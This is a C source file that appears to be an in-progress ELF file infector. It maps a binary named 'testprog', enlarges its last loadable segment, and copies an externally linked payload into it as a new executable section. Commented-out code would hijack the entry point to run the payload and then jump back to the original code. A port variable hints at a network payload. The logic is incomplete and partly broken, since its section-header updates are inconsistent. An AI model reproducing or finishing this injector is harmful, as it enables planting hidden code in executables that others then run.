#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/syscall.h>
#include <elf.h>

#ifdef __APPLE__
#define CDECL_NORM(x) x
#else
#define CDECL_NORM(x) _ ## x
#endif /* __APPLE__ */

extern uint8_t CDECL_NORM(payload);
extern uint64_t CDECL_NORM(payload_size);

#define payload_p &CDECL_NORM(payload)
#define payload_size_p CDECL_NORM(payload_size)

uint16_t port = 0;
uint32_t addr_ip = 0;

int main(void) {
	port = htons(3002);
	addr_ip = htonl(INADDR_ANY);
	printf("port: %#x %#x\n", port, addr_ip);

	int fd = open("testprog", O_RDWR);
    if (fd == -1) {
        perror("open");
        exit(EXIT_FAILURE);
    }

    struct stat st;
    if (fstat(fd, &st) == -1) {
        perror("fstat");
        close(fd);
        exit(EXIT_FAILURE);
    }

    size_t filesize = st.st_size;
    size_t new_filesize = filesize + payload_size_p + sizeof(Elf64_Shdr);
    if (ftruncate(fd, new_filesize) == -1) {
        perror("ftruncate");
        close(fd);
        exit(EXIT_FAILURE);
    }

    void *map = mmap(NULL, new_filesize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) {
        perror("mmap");
        close(fd);
        exit(EXIT_FAILURE);
    }

    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)map;
    Elf64_Phdr *phdrs = (Elf64_Phdr *)((char *)map + ehdr->e_phoff);
    Elf64_Shdr *shdrs = (Elf64_Shdr *)((char *)map + ehdr->e_shoff);

    // Find the last loadable segment
    Elf64_Phdr *last_loadable_phdr = NULL;
    for (int i = 0; i < ehdr->e_phnum; ++i) {
        if (phdrs[i].p_type == PT_LOAD) {
            last_loadable_phdr = &phdrs[i];
        }
    }

    if (!last_loadable_phdr) {
        fprintf(stderr, "No loadable segment found\n");
        munmap(map, new_filesize);
        close(fd);
        exit(EXIT_FAILURE);
    }

    // Find the last section in the last loadable segment
    Elf64_Shdr *last_section_in_segment = NULL;
    for (int i = 0; i < ehdr->e_shnum; ++i) {
        if (shdrs[i].sh_offset >= last_loadable_phdr->p_offset &&
            shdrs[i].sh_offset + shdrs[i].sh_size <= last_loadable_phdr->p_offset + last_loadable_phdr->p_filesz) {
            last_section_in_segment = &shdrs[i];
        }
    }

    if (!last_section_in_segment) {
        fprintf(stderr, "No section found in the last loadable segment\n");
        munmap(map, new_filesize);
        close(fd);
        exit(EXIT_FAILURE);
    }

    // Calculate new section header and data offsets
    Elf64_Off new_section_offset = last_loadable_phdr->p_offset + last_loadable_phdr->p_filesz;
    Elf64_Addr new_section_addr = last_loadable_phdr->p_vaddr + last_loadable_phdr->p_memsz;

    // Update the last loadable segment sizes
    last_loadable_phdr->p_filesz += payload_size_p;
    last_loadable_phdr->p_memsz += payload_size_p;

    // Create new section header
    Elf64_Shdr new_shdr = {
        .sh_name = 0,
        .sh_type = SHT_PROGBITS,
        .sh_flags = SHF_ALLOC | SHF_EXECINSTR,
        .sh_addr = new_section_addr,
        .sh_offset = new_section_offset,
        .sh_size = payload_size_p,
        .sh_link = 0,
        .sh_info = 0,
        .sh_addralign = 1,
        .sh_entsize = 0
    };

    // Copy the payload data
	memmove((char *)map + new_section_offset + sizeof(Elf64_Shdr), (char *)map + new_section_offset, filesize - new_section_offset);
    memcpy((char *)map + new_section_offset, payload_p, payload_size_p);

	// Move section headers to make space for the new section header
    // Elf64_Shdr *new_shdrs = (Elf64_Shdr *)((char *)map + ehdr->e_shoff);
    // size_t move_size = sizeof(Elf64_Shdr) * (ehdr->e_shnum - (last_section_in_segment - shdrs));
    // memmove(new_shdrs + (last_section_in_segment - shdrs) + 1, new_shdrs + (last_section_in_segment - shdrs), move_size);

	// Update the section header offsets
    for (int i = 0; i < ehdr->e_shnum; ++i) {
        if (shdrs[i].sh_offset >= new_section_offset) {
            shdrs[i].sh_offset += sizeof(Elf64_Shdr);
        }
    }
	
    // shdrs[ehdr->e_shnum] = new_shdr;

    // // Update ELF header with new section count and string table index
    ehdr->e_shnum += 1;
    ehdr->e_shstrndx = ehdr->e_shnum - 1;

    // // Update the entry point
    // Elf64_Addr old_entry_point = ehdr->e_entry;
    // ehdr->e_entry = new_section_addr;

    // // Calculate the relative jump offset to the old entry point
    // int32_t jump_offset = (int32_t)(old_entry_point - (new_section_addr + payload_size_p - 5) - 5);

    // // Write the relative jump instruction at the end of the payload
    // size_t jump_instr_offset = payload_size_p - 1186 - 6 - 4;
    // *((uint8_t *)map + new_section_offset + jump_instr_offset) = 0xE9; // Opcode for jmp (relative)
    // memcpy((char *)map + new_section_offset + jump_instr_offset + 1, &jump_offset, sizeof(int32_t));

    // Cleanup
    if (munmap(map, new_filesize) == -1) {
        perror("munmap");
    }

    close(fd);

	return 0;
}
